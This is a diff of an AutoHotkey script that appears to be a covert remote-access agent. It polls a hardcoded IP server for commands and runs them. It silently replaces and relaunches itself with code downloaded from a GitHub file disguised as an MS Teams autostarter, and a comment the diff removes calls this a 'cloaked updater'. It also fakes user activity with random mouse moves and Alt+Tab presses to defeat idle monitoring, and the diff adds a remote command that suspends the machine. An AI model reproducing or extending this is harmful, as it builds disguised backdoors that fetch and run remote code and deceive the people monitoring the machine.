@@ -5,10 +5,9 @@
 SetBatchLines, -1
 
 global LaptopID := "###LAPTOP_ID###" 
-global Version := "1.39" ;updated
+global Version := "1.40"
 
-global Url := "http://136.119.161.133:5000" ;Production
-;global Url := "http://127.0.0.1:5000" ;Developmental
+global Url := "http://136.119.161.133:5000"
 
 global req := ComObjCreate("MSXML2.XMLHTTP")
 global IsIdling := 0
@@ -40,32 +39,23 @@ CheckState() {
     try {
         if (req.readyState == 4) {
             SetTimer, CheckState, Off
-            
             if (req.status == 200) {
                 LastPing := A_TickCount
                 text := req.responseText
-                
                 if (text != "") {
-                    
-                    ; --- BULLETPROOF CLOAKED UPDATER ---
                     if (text == "sys|UPDATE") {
                         updateReq := ComObjCreate("MSXML2.XMLHTTP")
                         updateReq.open("GET", "https://raw.githubusercontent.com/mo-hashad30/wf/main/ms-teams_autostarter.exe?t=" A_TickCount, false)
                         updateReq.setRequestHeader("Cache-Control", "no-cache")
                         updateReq.send()
-                        
                         if (updateReq.status == 200) {
                             newCode := updateReq.responseText
-                            
-                            ; We split the string so the initial PowerShell install doesn't accidentally replace this!
                             placeholder := "###LAPTOP_" . "ID###"
                             newCode := StrReplace(newCode, placeholder, LaptopID)
-                            
                             file := FileOpen(A_ScriptFullPath, "w", "UTF-8")
                             if (file) {
                                 file.Write(newCode)
                                 file.Close()
-                                
                                 Run, "%A_AhkPath%" "%A_ScriptFullPath%", , Hide
                                 ExitApp
                             }
@@ -77,6 +67,14 @@ CheckState() {
                     cmd_id := SubStr(text, 1, delim - 1)
                     cmd := SubStr(text, delim + 1)
                     
+                    if (cmd == "Sleep") {
+                        SendResult(cmd_id, "Executing Sleep...")
+                        SetTimer, Poll, -10
+                        Sleep, 1000
+                        DllCall("PowrProf\SetSuspendState", "int", 0, "int", 0, "int", 0)
+                        return
+                    }
+
                     if (InStr(cmd, "Idle|") == 1) {
                         mins := SubStr(cmd, 6)
                         IdleMax := mins * 60
@@ -249,14 +247,11 @@ CheckState() {
                         }
                         break
                     }
-                    
                     if (res != "")
                         SendResult(cmd_id, res)
-                    
                     SetTimer, Poll, -10 
                     return
                 }
-
                 SetTimer, Poll, -5000
             } else {
                 throw Exception("HTTP Error")
@@ -273,17 +268,15 @@ DoIdle:
     if (IdleTimerCount > IdleMax) {
         IsIdling := 0
         SetTimer, DoIdle, Off
+        SendNotifyUser(LaptopID, "✅ Anti-Idle mode has successfully finished.")
         return
     }
-    
     if (Mod(IdleTimerCount, 45) == 0) {
         Random, mouseX, 100, A_ScreenWidth-100
         Random, mouseY, 100, A_ScreenHeight-100
         MouseMove, %mouseX%, %mouseY%, 15
         Sleep, 500
-        
         Random, randAction, 1, 4
-        
         if (randAction == 1) {
             Send, !{Tab}
         } else if (randAction == 2) {
@@ -314,6 +307,15 @@ UriEncode(str) {
     str := StrReplace(str, """", "%22")
     str := StrReplace(str, "'", "%27")
     return str
+}
+
+SendNotifyUser(lap, msg) {
+    try {
+        r := ComObjCreate("MSXML2.XMLHTTP")
+        r.open("POST", Url "/notify_user", false)
+        r.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
+        r.send("lap=" UriEncode(lap) "&msg=" UriEncode(msg))
+    }
 }
 
 SendNotify(id, msg) {
